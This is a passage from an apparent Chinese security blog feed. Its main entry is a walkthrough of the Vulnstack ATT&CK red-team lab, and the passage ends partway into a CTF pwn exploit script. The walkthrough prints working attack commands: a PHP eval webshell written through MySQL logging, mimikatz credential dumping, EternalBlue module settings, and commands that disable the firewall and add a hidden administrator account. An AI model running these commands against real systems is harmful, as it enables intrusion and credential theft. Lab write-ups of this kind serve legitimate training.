        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="4a2ce63102b6bd36fa38f56c121a3bf3b5748e9a69b0eb8678d15e89c6a6c14f">2239f6ef2369263b61ef594c41be1d81caaad9e00dfd39e2e6679848a71a75425b783f2084bbe71c207ed1c250fb2ed6cefc9a851b67880d7dd7f0b02318ccecec0a1f5749dc5908d23dee16a3508513fe37119411562cbbb5d634a272aff775b8c6a9c62a408918e678f0d6bb87d7f46cea299b2622226a9fb035528ff190134e9c163ea194eb3a48f184695971feddd614fcbdfcdee23dcc63f0f7044910b9fe46108711474677c334bbda688bd66cdcbf0a6666169dbe9027ec7c00ae523c0a8167670f57a8cdeeeff847cb6f13d1a2323c4d3307ecc8662ee01301bac6c0e666d6490fe81d0cdc252b67400d47093fa64ecd9d47ae3bacf30425342665d5af2f0b05fdc30424b7758f7d874610f52eba9f79d1a351059111401a5e239c358a7388b73b113d10c1a80a4539794a50d4e8631bc1d79b9397d33370b5cd992a081d8f88a77ae161cf877c34f8c78c94a32c0b64557692d31a923915ec277287ec04134d53aeefb39d58336decac9c0287654afc1dc3df96e99d41f83ff9f95ad4cc47f554674e1a62cbc1b653b33e9d9f0ee1e5a48935ec615e00a375e8c7c956045955d77aae6c9737abdb8ccef7d854c80d7f9f26487c7461242574aaded28644d7e69a364fb160a732354796043447eb3b0f1816ffec7679992ad561e5b8a109819d73e7918e6f6aa38bcde1fc3b627c2338bf2538f1678c8256d81b014cb7b2d27b2fe00ba3e15e6c804d8806b1b35f0c39b4f1023e5a59ef971e16162ab1eee3337a36e84cecbb111dcb1158957a8953aad18177f2c4ec4fb74715ff8176fcbe60611df03e307d2a7a905ea8421f797d7edd47fc5c3e381789fa42a07feafa9fff6f14b05061808f23d14e7bdf61b5a2b35d57d7b5023e1361fb93d795d2dd960421098af14ddf89b15fb1fb3dc5d0e08c0b76401ee2d2e59f5d35f402ecf5002d5315071f46a4e5a0df6977e2cf5e1bbb38c831cf510ce3effaa4fabc662ee07142ca94cfc74f146f4a526ad4297372999cc8476d0d409ea3aaa3a24b076ab10539c9dae044c6b6ebfb48ff15451946e0a1b1c5f446e45303ecf7253f3a3d5d007264a6d364028974464d2e8da5ea34464b507d6e634b85f76e174d3c488789f978dc63fa324abbcef9dab85f810e104864681b1c893acd1dd8b4c47e91e5e07e708b55fb42176d91591405b3a5da741fa8e03f411962d11f5ba660d55a1fd02e6a8d1353685b932ebf49feb78300399850b9542c1e4e732a1b85c7fb934154da69d9fc69e4d6cb2ff03e770214111e749c7e33915e52717d1fc384a8daec743d40ea8bbf55543af8852a00742a39551db3aab4d61394c22613d07d6d2d80b1c555c68d8ecff47be454701c969399a637e7305c6aae9a80a2dca3c47bd8a92bed556706eabc0e342993632242e4182cf0abc4f85e9383a2c18816247733fce73d6dcda6146c04bfde6fb14d6fadf592d35b54743afa2f652942cfc9933aa77535b8f5382ca12f663eeac4616e24176ad0c8f8e51f41af64dd077a638cd2a0baf117787e09ab7fd78fc7594dd323a53b51c98a91d4f2d065e3c0f8de791723870da8d0d4d5da505fd2147a2bb19952f644e060746e4b2f27dbeb6cf404a7c250687a84803a4a79f69a84f7956e29e683ccb884ae9c191478e1c0504f42629184220f4b48b53484f4a6cc80b892990a50ad95e8592c37bfe1e376961ec4b73192f3b3cd50033979e0eb6fb7b85dbc8eb801a38b0d5e35006177589941f2d1e076f8f7ad87e9ece5f0a6e51bee55ecaa0ee69286e898c36eb25de8a6dd7b29db23023c2990267e9842a51ae9757f75d04dac500ec1e0e213bf903e03c6f00bd07033c85c261e27d7781fdbab724f5c57aaed777544d75c58373af39de2bea5c8ce597e5b90a39d3a29245458971e4c761627f2a11f8a5b9ca4d7d831e9032bd8932dc614512f04fad8a8716852ce31db4c082b00dd868227c33fda9edba0c8150d510bb4f4d9d66916c9abfcbf6d9e83f44bd2fd508d9b2f997197ce6782ef310e939bcde8acdbf088588466848d4c7bd756ca44821b4d76050c2cb07f81253bdae58506c75862d2fc5170dac664896f980bcf58338d6694034b677d009d2ee975317343f1b3158c431e5b7d37f37b5b149b811943a870fec898c74a05e24b598e98e53492191466f57cb24fd82b7e77d2f889b577a0dc95c9f3f412fabe0b4583e3bd9f2b209922778161f7ef14946cc043e14d8419aff4cd3624498b07fd2d17e8c3658065b79ace99be34f03b29144fceb8ff9cae608e84b1ec1696370d481bf5c118e0b719d9ec6fce8d9f41ccef8f324d89d3b2ddb3f1dedeffdf819331b910611e00409b41edd583406cc513c4bc7292d3e19110432fa7c8e04dbc43fa203d99905ec3dfc09a01c7870b177a1a7e1fde403a4d934f7f4b3da00b7d7bc59bc793168b7171c82b40eae28eeed1717a7be936cdbdacfb0f8d9203f6856769285b53f7f4ce3b2323207caa1284dccb4bc663d17322e6047c1aac97359ee1932bf67478081c66f60a2aa612286d3c11698e4bfc0d9273a6932991527a9572ef9f8e72ffeb078302932eafb81c45e1e846f3b9d01f49f8f0641c8c34771e7637e1cacc5105d42bda7367fa548328d210e570cd8f1e364b86a7dbc3151238e22416d6f84e7f1755ea65ce55d42e73ff10d907e75297feff42518b5e3a548a151dc516c2b058b95d923f439ad6e3c7ed8fc2e3715ab22cae729bcef9cd8ee06d9e34d8ddb26ae3480fa7e10b2d44a7628b6ceeb94b5f11ff1992c1e44f24495b667a0a0d4e02dda26405c3503363f0f1a52383e6845b291bd3c4777e601832c6f37f0ba2bfdea3800ed5b26dae5ea68a533c5da3d6e0a019a3e731b29cf0cc4de0aebdaabf3d33421a7bfefb62160a7db4ba134daedcef2d00d557e60cb1b5552556730f36f41783f6a1cfbe6dd6c5fac1a1a86f617294f11b11b389d6363b4476928841f870623f983a1e4aadf99645fbbd8c5e6d2637108fdab52b0b3e05ca86333382ad8c44b2600b6a08ca07baa699fec65358b31946f28fbaab068b16c562af9749f4b4f0eeb9c1894eacc477ba835bff0bdbab2b8cb2d738f857c47334e22eb6f4b44b373a093082fb74ddc928b3dba1331c84f94bdd81757a90badbee48269a24b564220043e5344a3af0fcabcd0dc8af4063ba43795ef6c606de4d3321fad8b771a214ab3e3a3d58293d780d901c8c7ce87c875d8ee2a4fffdcaf53f92bf29e6debe78f9c868f951c37b282e6755466e641ed5600c619e5129c5d300e4bf4921b5c38d12ff1bb375563f10a23f8fd133d40f0c22c58c4ac02f156253718b5db7eae3bc89541bc5f1eab2b91444386935c00a744ade8177c2348597334d70a24e5f0a216ed282f6a09358135768431741cf59079929fdef4a367f59327a03f0b6dc037c9e10906e78bbc746e3247f78cf6e5b63ce378c4872061cdd530ca49a04aa0d35b6d33902bb28a106636b65ff82d55aaa3ce26d0b39a6277a65d9f567c429bcc7e667ef1afc4e675e87a93991ccfa1aea55384eaa20d718f9eda7fbcb30d3a84bc0e51dfb68d2beca0c3a305554e386a57bfe2f77e0b1e425563bbbcab4c979941f554bcc44e059c44829233e3559fb4e1d8fff1ec1dd03a45e45b889f910beedb9a889329bf377c622b56f892b6235ad81419980523e5886e02c12077b939aba67a02c6cbe9e3470616f28c21aaa3815550c4afbd2d918c4a28c47f42e79fa07f847d903ef3bdb6cc081a663e8318181b1d2692aed7ef5861598194e76b4eeb345a14c207dd3bae0002d0ca3aa7da15df6583b4437dd82ba6c0a9a183c54a44ca9b5e56c42871aaf0d1546fbc66da304e83661cc4fccb00e3cb60424f3c5e77f5965aca5b89b2cb8a7caf41da86968270c7b327a617808e9c4f7000156f5ff6ca51f020de0c5b5b856c90dac7741432e46a9c61d97b3dace6fa951d24245c9396ddd29bff0157e89dda054b493c5370a74eda4f07c2425a386490c0d482fca0e007648d6d5a73c227d39e4e51f984810751aedbf4b685026b94f1c4819c130f8560783ab97468696663b96363012cc04465be3261363a1babe51cb9a44456afc908947d01f5eb30304bd95ff571a005b64491d0d996cf43b628f8c6e7d1a5ab5db5fa15a178d5eb979052b8b1707a08bcc66ba4dbc33ea874f92352e5e5b4c32c38d2fb48c3a9620559ec6ebca5696a200f6d91a36b44d7623bd518ac02eb80fd9eb796fcc88f75ae5cc7bf28356d8d7870517cad4b16fbd06e351cd8e67bbe93278bcfa001ee9f0ef9de4147c148aee315685d2b6cff43565baa629ef30c3bbd04b7d814cb73c3fabe683d109ac8b2cca25e2155e115ea60ae07c8fc3fff808af3e1a10d359e096c651b177e3c5bf64f15c61f8253c680eedb977b58d0d29806aa1d62ce34e46378cc70c2ca151cd1ca60990e9506e7cfbcac82346ae62e6340f2ac592fa6d587e4ffd04ce500cf4b25feda3a0d9beab4ff25ce4bf52e2269d6a80296b5fed397cb2d5ea99ff597ffb92507e0461d2beecd6642e45eb92d8343faf0be28830b0695cf4c2c3e9b7f690e02ee4bdc0e93afd909fcaeed97b32bfa6852cb162f7655742e8dc25749c12abe5722075a56444ba9b643c50443ab812cbfd4409d4616ccf4db68493ccd9e5b5cfbc76bdc6681c4af3981280b903cd0e6dd078dda72ad85afe9bc9ee8049cfebc07be71358f0f26190e64db0a71a1cd4122414e6ab9446adcef763dbd026063b13a6403ae73450a68fce2754b3c7d01bc2c3f56a2c33bc49bf89fb0a3c339fbeb1c338874886599d7a1b6846a1d0518d8a5eee3df734bca6b8ac8d838d23bc1e009058a63f43bf2c8117f3986b87d9920fd7d4e3c99d1de07e42674d8ab329f75e70fe920f332b58f98902aa7ec71406e148ee86994a76eed5d082cafc566ba2011e4a2cffacd1bbcc6d1af96efc9b36eb0c3e071ceb2044b33869fd6eb32cbd028016315e9915c29de736ed46483a09a1930c0816f29c7927041f6a1da9dd8c58d5d8ec7f3cbc99c61a97f889237ffe51837eb97fb5495a957bafc480f4125a54c6b313be0a4a4392c54d627ee5f42eb276b5d742bd9a698c430cc874572c8bb777955814e4a26917128600c7d1b1d48bcb9106a556cccb4adfb6b94110cd6eb67ac1fb4c585d14a61336698c863cf7d5e07117ba4a88362f21248362ec6a6fa91de7ec8e0b301bec6db9b45c443cd0664c649a1c4af0cd3ff6436a3707154315d47b536de5af8da495237b3517bb573e1619937c2fbb8af0ba34a4ecf9dd81ad3fe74991f2ea682ce21f84bd21727fecf5ee153d59d060fbdf5a0c195587b5a3e8294e0cf1c41f506732b15c21f56269f15de98d864fa8b8e71fee64fe347d100cb93b6265401a72dea81befcb576c4fc9de1cf4d804871403ef2085292191a445344b75499ec956da29d1b10f77b61560974ef05b0b1062a7bf4ef682d5c06686f21e70ede6e8bdb1cf11cc7da9d7926ebeb055e7f2bea5a86e5e0f25a5daa3f5935512b50fdfb934e5594d9f1d2a4f897a3dbf7df4ada3be40bd06af8411cd6de12f8b25c861f4cc3227a994f2dc8796d868d8b1d1ee7a01b0ed895db8dcead26cebf9cf6c6b3fcc385d2db5a3137d841f59e27a7964c3b94e3926bd9cf7e40ebcf747d587c32df17a1e7efbf754f44da349eef2daa9258299396549790632c310df26f386de53121f8b81c464e83ce36be091d14aefb2cc13f24d27ea11ce0cf103e99372f919caac6c206a81e0f47d637eb9b710941120bdd264f0af10463ef9f262325565a1261815f1274764b130d3ffc67edcacb3de7b4f098b458b204d455b12d2579a069114b64fab9172afed1969d4dd2429c756cfedb097048c6ce1ae5bc37d394701d276cd542c1f44ea64916ac634786044b672bdde3fe97e441d014e13a731bc0cf7484d8978e33ef9688184af8cd6892ce75a962fcf2640e1d6e71d157418d22210c3a504ada211ad1c9b422e6c823abd9c4a8f6693f0c2a2ce88acaa6d1bc98bd32f92ce31afb1479cc13238bafb10b24af03bf3436f976ea6c3e28a8f80e6f1fc90984da29d7f460e5660282933b99ca73247eaad04eb0d8983b923838d6daaa4dbffd8e261d5d55b45832e00536e49a58720f7d834acd3ccb8e2e1cb53a7de280c536cf52be281b28ee23165c382f0319f6eca143fa7c4605ead0c6d112e99c99bc9891e3b3381a3c6c36257a362a2f360ff6699cfe05fde4a8ebb0c86069ec2231a50cd2cb606d6f502e70887de08a7f19faff7a9d60a5d607a31caea0fb56cf9831b6133b308e7001cecc4ded84ea3f2c5f4969c44791a2d10cf49f22184dc8305eaba6536dff0276ee925738cec341bf5111390265e076ac6aa2b47e09384fef35b955337782fd219a95c051026296fcddd06194b570d5a4deaf1b3a3ec6b246a93e655501571d576f4fa32d02aa5a2a60bd807554d608a5e70eb6abd21cf12d4aa2f54dd76db3c2373fcf52e6493bb7155c05ed675b546fd50221fd3dd55834b3d8d9a5bee8417f338bf7d733f15910284525b86d8153449acd99a17cabf1a81f830864e2d5e116f74125b3462dee23225b89ba40bfa858d177a181565574a1940e248caab6f26e54cffd9d438bd15de2bb691df104d755c617fd3c50f030bcaedbc8e449b1f53b35263fbf694578d812d26d7b694726f654e3a8af60b410c99e6de0526605aee9bd54b33b4cce2030b1309d2c9d05571e1aee5fb2e855b33255cd609c320ce4f45d253d3e0f632c12a4ea8d443130f8d0bac2895d4b0326371f2027978297a45da8ab7ad8e2a864a067d83e5c4253c9bea30659e6dc650ec840a00bfa1ef6574030090168bb6bd30ffa89c66ee09815369cd2058d9d0bc73a38f2f49b8c270ab8a382809f2d9d6f43d1e31cbfba00dbd8d44f4e67fdd0b2cc8e06fd878d4fa2179430a9eb6bf7c5f4f489c30ff978a51fe64102d0a58f71abd6b9518cbdaa69f1ad6b1988f14cedc6db0fe061c877647f83f57b7d6404c2e4a242568bb60ff87a16da258ef58a220db6404aaa18f7fe96e1b513f496877b418894d93d64a05116c3a63f56cf877b8a9a84e01a98e60475b5843628fa37899f8c64fd577301af5bab9ee0ceb5595c4fd4adb496bfec9b83acf80d794f7ba8bfc04a5b41837aa202ae78351ab4177377b4c7fdf4a88f8e33f354eca9f059fde1a7378b7a27953d96f1b6b31a070c8e1c1419a487c00e0eb364e05b8c12751079623a1363e1a370f9617b9f500cfb91631f7229387fca549a43f127bc97a2bcacaf73ddd2dbb650f70e4338310fd15bc3c6127418ee4150c42db0645456f738ae6b742651ec01c37b142fcae69359057f9050ca2b8696ed2fd756ff4fb242b82b5a8340fe13b6e8fa125a32b83b6777f21858a700181506cde27028476f1720a03eab284e23f046009e8755b3b833c335f51b4356994a603c4ce8200aaa290f25182e0cc534441f473b16ee4e5ee2ef7eabfd11b4a5d4c9f08d3d33505cb4ab33b7a65c327942b6465951ea335ffe9c9f2fceb65323c46ddbc0ba79117e909af1d5539db374c18738ce248c85eb6872f215bb87687118b3ec626d61a6d1e67d9bf36ae536375f64742cc2d787c4e69a9d7469242542f63a164ebc14dd7e7cbcfeedc5cd0cf4e36db4d73866927c1467dd0535106e7c2b6dcef8d55c0f6e02645cc0145193d15c8b1816253f8f1096309b1a1720af092af338f2482f844ae13b996368b6b586f3efd33d41e8ffd86e746e1b0458d2e0aa3904aaed4e3e2ebc8abad9d95b63e61db81585ff00eb8d5f980ac99a19d785ca01604e680363630267e277b1523a49a95f5b4ce309eff059787bee6cedee51b49f17c871ce5d013c4e6a68fd02461304a53267a82ed32fd159c7fa78b610e1ecbcf347bd7245c0c5929c3a76f5c31d1e3378d022cf02894979c1d2039f0a633746a1621f8947f0d55f504bc39fc28b67564c8de93d3ee95130f8b462a271a1a81ae6149cf35c9e5457828ec4ca39e6773ce9d669a5e9168cefbd235c1752c1cd5266a55ce935d7af3da24c9d043f731888f696fbf18feae75639d3a93728d8773c2c55ed757131e628f94df3140130f249fb2bd15e75e</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 逆向工程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AV </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ATT&amp;CK红队评估实战靶场-1</title>
      <link href="/2024/09/27/ATT&amp;CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA-1/"/>
      <url>/2024/09/27/ATT&amp;CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA-1/</url>
      
        <content type="html"><![CDATA[<blockquote><p>下载地址：<a href="http://vulnstack.qiyuanxuetang.net/vuln/detail/2/">漏洞详情 (qiyuanxuetang.net)</a></p></blockquote><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>网络拓扑：<br><img src="/Rxi134_FILE/d7dd99fe113508cbf08ada16b18c69ca_MD5.jpeg"></p><p>初始的密码都是 <code>hongrisec@2019</code>，部分可能要重置密码</p><p>域环境的网段是写死的 192.168.52.0&#x2F;24</p><p>在C盘找到 phpstudy 启动服务<br><img src="/Rxi134_FILE/66b08c3cd34492516801ae06253b9624_MD5.jpeg"></p><h1 id="外网打点"><a href="#外网打点" class="headerlink" title="外网打点"></a>外网打点</h1><h2 id="phpmyadmin写马"><a href="#phpmyadmin写马" class="headerlink" title="phpmyadmin写马"></a>phpmyadmin写马</h2><p>访问站点是一个 phpstudy 探针<br><img src="/Rxi134_FILE/6a6179b7a8c5d2368b842b6ea8ae7a36_MD5.jpeg"></p><p>扫下端口，注意开了 3306 端口<br><img src="/Rxi134_FILE/605b2a9714c8e53b1cdc7c48b6fb558d_MD5.jpeg"><br>有防火墙</p><p>dirsearch 速扫<br><img src="/Rxi134_FILE/2838396d0573f8459b81f3b52a7399b5_MD5.jpeg"></p><p>&#x2F;readme 查看到版本为 3.5.8.2<br><img src="/Rxi134_FILE/649c61ddd29d4580811dfdcc03f4972f_MD5.jpeg"></p><p>root:root直接进后台了<br><img src="/Rxi134_FILE/3a56f2a12461d4fad5ecfe87ef16074f_MD5.jpeg"></p><p>第一步肯定是写马，通过phpinfo页面泄露了网站绝对路径 C:&#x2F;phpStudy&#x2F;WWW<br><img src="/Rxi134_FILE/78453fa6fde1da6dbad9fbc2caeabc09_MD5.jpeg"></p><p><code>show global variables like &quot;secure%&quot;</code>  无权直接写<br><img src="/Rxi134_FILE/8b5f038fc0e8113cf2f25a5e102a53a6_MD5.jpeg"></p><p><code>show variables like &#39;%general%&#39;;</code>  查看日志状态<br><img src="/Rxi134_FILE/e062de56aa4d26682f87334d618d01f3_MD5.jpeg"></p><p>打开日志写马</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">set</span> <span class="token keyword">global</span> general_log <span class="token operator">=</span> <span class="token string">"on"</span><span class="token punctuation">;</span><span class="token keyword">set</span> <span class="token keyword">global</span> general_log_file <span class="token operator">=</span> <span class="token string">"C:\\phpStudy\\WWW\\fuck.php"</span><span class="token punctuation">;</span><span class="token keyword">select</span> <span class="token string">"&lt;?php eval($_POST[pwd]); ?>"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>蚁剑连上去<br><img src="/Rxi134_FILE/22dcfc7cf6830bfcd2f039159866ae1e_MD5.jpeg"></p><h2 id="yxcms"><a href="#yxcms" class="headerlink" title="yxcms"></a>yxcms</h2><p>拿到了shell，不过发现有一个 yxcms 目录（数据库里也有 newycms ）<br><img src="/Rxi134_FILE/5851e7a33c9394a25dc4c433b7c37f4d_MD5.jpeg"></p><p><img src="/Rxi134_FILE/075fe84d667cd331805108e924180898_MD5.jpeg"></p><p>直接进入后台<br><img src="/Rxi134_FILE/60ad05e0511dbd0dcd4373500a1793b0_MD5.jpeg"><br>这边在前台发现可以更改网站模板<br><img src="/Rxi134_FILE/542275ea3a4be53c9a4eaeaf2b637cc0_MD5.jpeg"></p><p>在网上查阅资料，模板文件位于 <code>/protected/apps/admin/view/</code> 下<br><img src="/Rxi134_FILE/cdd86ad2510038db60db1008bbdaf1a0_MD5.jpeg"></p><p>写入webshell即可</p><h1 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h1><h2 id="内网代理"><a href="#内网代理" class="headerlink" title="内网代理"></a>内网代理</h2><p>这边发现web服务器处在 GOD 域<br><img src="/Rxi134_FILE/62bde2c055f864a41df2359c7d2fc81b_MD5.jpeg"></p><p>使用 frp 作为反向代理，反弹shell到msf<br><img src="/Rxi134_FILE/a9893884ef8ead61d86368998319d2ad_MD5.jpeg"><br><img src="/Rxi134_FILE/44f4483735f8b10879da4eab5d036ba8_MD5.jpeg"></p><p>ipconfig &#x2F;all 发现了其它网段：192.168.52.0&#x2F;24</p><p>给 msf 添加一段 session 路由：<br><img src="/Rxi134_FILE/5dc634869627198f50e88c8072ad3f26_MD5.jpeg"></p><p>利用proxychains 实现内网代理<br><img src="/Rxi134_FILE/d08d392b01088f46c2e8d78e40ad90c4_MD5.jpeg"></p><h2 id="内网信息搜集"><a href="#内网信息搜集" class="headerlink" title="内网信息搜集"></a>内网信息搜集</h2><p>win7机器。主机名为 STU1<br><img src="/Rxi134_FILE/4888e3a5a05fa13d29462b3eb307baa9_MD5.jpeg"><br><img src="/Rxi134_FILE/2423b262365f3d131f5747fd526d113f_MD5.jpeg"></p><p>管理员权限，直接迁移进程到 lsass.exe<br><img src="/Rxi134_FILE/48c6914e05b0a6d30470d24219dc58dc_MD5.jpeg"></p><p>mimikatz 抓取明文密码：<code>god\Administrator:hongrisec@2019</code><br><img src="/Rxi134_FILE/ac5dbe258bda12ef7271887dd5ec77de_MD5.jpeg"></p><p>windows防火墙处于开启状态，直接关闭</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">netsh advfirewall <span class="token function">set</span> allprofiles state off<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>开启远程桌面</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">reg add <span class="token string">"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server"</span> <span class="token operator">/</span>v fDenyTSConnections <span class="token operator">/</span>t REG_DWORD <span class="token operator">/</span>d 0 <span class="token operator">/</span>f<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/Rxi134_FILE/a0ad78682d9f162654779ff0317b14aa_MD5.jpeg"></p><p><code>net view /domain</code>查看有几个域，只有GOD一个域<br><img src="/Rxi134_FILE/0f29f7520a5a593a4b331285e14e9af9_MD5.jpeg"></p><p><code>net view /domain:GOD</code>查看GOD域内所有主机<br><img src="/Red_FILE/7d6c6afce54bef7142e2bcb011f4dfda_MD5.jpeg"></p><p><code>net group /domain</code> 查看域用户组<br><img src="/Rxi134_FILE/f23f2d20a63f6b909801c35a6d5e5317_MD5.jpeg"></p><p><code>net group &quot;Domain Controllers&quot; /domain</code> 确定DC<br><img src="/Rxi134_FILE/944a26e6658ee835bff7b566f2e3ae1f_MD5.jpeg"></p><p>既然在域内，利用 netbios协议 探测内网主机<br><img src="/Rxi134_FILE/25c5c05f8140aede807e09a51bd922ba_MD5.jpeg"><br>确定 141 的域PC ，和 138 的DC</p><h2 id="永恒之蓝攻破DC、域PC"><a href="#永恒之蓝攻破DC、域PC" class="headerlink" title="永恒之蓝攻破DC、域PC"></a>永恒之蓝攻破DC、域PC</h2><p>通过msf搭建socks5隧道<br><img src="/Rxi134_FILE/7190ed049d8a421673767639b2135e54_MD5.jpeg"></p><p>proxfier 检查<br><img src="/Rxi134_FILE/4a880d027642c2a0b6f1b0d6faa982f0_MD5.jpeg"></p><p>然后设置浏览器代理<br><img src="/Rxi134_FILE/939fb88fca8c009f7fbb65f45fd6424e_MD5.jpeg"></p><p>成功访问到内网里 DC 的80端口<br><img src="/Rxi134_FILE/4eb1cbb89f9311facea2a54ee1beecce_MD5.jpeg"></p><p>端口扫描，利用  proxychains 将我们的流量带入内网</p><p>138 DC端口开放情况：<br><img src="/Rxi134_FILE/f28880db586a6aa81d22407edf3c5fe8_MD5.jpeg"></p><p>141 域PC端口开放情况：<br><img src="/Rxi134_FILE/194285cc6d827ef391a6b7dc176d4ef7_MD5.jpeg"></p><p>很敏感想到永恒之蓝<br><img src="/Rxi134_FILE/56e0d75fedfb5066f1a0d1bae4133ed2_MD5.jpeg"></p><p>先打DC</p><pre class="line-numbers language-msf" data-language="msf"><code class="language-msf">msf6 &gt; use exploit&#x2F;windows&#x2F;smb&#x2F;ms17_010_eternalbluemsf6 &gt; set payload windows&#x2F;x64&#x2F;meterpreter&#x2F;bind_tcpmsf6 &gt; set rhosts 192.168.52.138msf6 &gt; run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>但是反弹shell失败了，网上查阅永恒之蓝直接反弹shell的几率还是不大的</p><p>这边使用 admin&#x2F;smb&#x2F;ms17_010_command 来执行命令<br><img src="/Rxi134_FILE/8c31fb6cec07c86d799101be58d71c2e_MD5.jpeg"></p><p>那就简单了，添加一个用户并加入管理员，同时开启远程桌面</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token function">set</span> command net user x1nri Zzx<span class="token punctuation">.</span>123 <span class="token operator">/</span>addnet user x1nri <span class="token operator">/</span>active:yesnet localgroup Administrators x1nri <span class="token operator">/</span>addreg add <span class="token string">"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server"</span> <span class="token operator">/</span>v fDenyTSConnections <span class="token operator">/</span>t REG_DWORD <span class="token operator">/</span>d 0 <span class="token operator">/</span>fnetsh advfirewall firewall add rule name=<span class="token string">"允许RDP"</span> protocol=TCP <span class="token function">dir</span>=in localport=3389 action=allow<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>设置 proxifier 代理规则<br><img src="/Rxi134_FILE/00ceda9c0016f0832a563c6231c8db56_MD5.jpeg"></p><p>远程桌面登录 <code>god\x1nri:Zzx.123</code>，拿到 DC 的 shell<br><img src="/Rxi134_FILE/23a2af87a7ffda74e88781eaed7fc00d_MD5.jpeg"></p><p>上传mimikatz，以管理员运行抓取密码</p><pre class="line-numbers language-mimikatz" data-language="mimikatz"><code class="language-mimikatz">mimikatz # privilege::debugmimikatz # sekurlsa::logonpasswords<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/Rxi134_FILE/70fe24cc8636b188b0930577bcec469b_MD5.jpeg"><br>抓取到密码（环境搭建时改的密码）：<code>liukaifeng01:HONGRISEC@2019</code>，但是并没有抓取到administrator的密码</p><p>选中快速编辑，方便复制黏贴<br><img src="/Rxi134_FILE/de5d490af01e9a90d3a0ad717bd8cfcd_MD5.jpeg"></p><p>跳板机无法运行frp<br><img src="/Rxi134_FILE/c09bb9abe5947989b47e91dce7ede880_MD5.jpeg"></p><p>关闭防火墙，正连拿到shell<br><img src="/Rxi134_FILE/c558ddc843f8c9a589e8be82428568da_MD5.jpeg"></p><p>同理，利用永恒之蓝再拿到域 PC shell </p><h1 id="利用CS"><a href="#利用CS" class="headerlink" title="利用CS"></a>利用CS</h1><p>这边利用CS再走一遍流程（对CS不太熟，加深下理解），这里使用的是二开的CAT CS</p><p>设置一个beacon_http的监听器，监听80端口<br><img src="/Rxi134_FILE/e2621704b1231742b5ea146581e5d4a1_MD5.jpeg"></p><p>上线webserver，直接拿到了administrator权限<br><img src="/Rxi134_FILE/07d69db871fd49c5e67a8d126118e452_MD5.jpeg"></p><p>设置心跳时间（这里不是真实环境直接设为0了）<br><img src="/Rxi134_FILE/82e77dc5fb7aef4133d9651f2df74207_MD5.jpeg"></p><p>通过自带模块 getsystem 提升权限到SYSTEM，再通过进程注入返回一个新的shell<br><img src="/Rxi134_FILE/25b63f034b9008bc32f18d9b32f215a5_MD5.jpeg"></p><p>net view探测域内主机<br><img src="/Rxi134_FILE/33b1dc2afcbab5f2afb38ef6cf43a33f_MD5.jpeg"></p><p>上一个fscan内网大保健<br><img src="/Rxi134_FILE/79f4a4425c10ad714d943c7f01d71fca_MD5.jpeg"></p><p>我用的二开CS，不能直接派生会话给msf，只能重新上马了</p><p>在 跳板机 上设置一个新的代理监听器<br><img src="/Rxi134_FILE/57a05d38484ff210802fc0ba4bb1dfc0_MD5.jpeg"></p><p>之后就是正常ms17_010的利用，略</p><p>总结：CS真方便哇</p>]]></content>
      
      
      <categories>
          
          <category> pentest </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Vulnstack靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>长城杯京津冀2024初赛</title>
      <link href="/2024/09/18/%E9%95%BF%E5%9F%8E%E6%9D%AF%E4%BA%AC%E6%B4%A5%E5%86%802024%E5%88%9D%E8%B5%9B/"/>
      <url>/2024/09/18/%E9%95%BF%E5%9F%8E%E6%9D%AF%E4%BA%AC%E6%B4%A5%E5%86%802024%E5%88%9D%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<h1 id="flowershop：简单栈溢出"><a href="#flowershop：简单栈溢出" class="headerlink" title="flowershop：简单栈溢出"></a>flowershop：简单栈溢出</h1><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python3</span><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token comment">#@Author:X1NRI</span><span class="token keyword">import</span> sys<span class="token keyword">import</span> os<span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span><span class="token keyword">from</span> ctypes <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment">#from LibcSearcher import LibcSearcher</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span>command<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment">#dbg(None)</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token 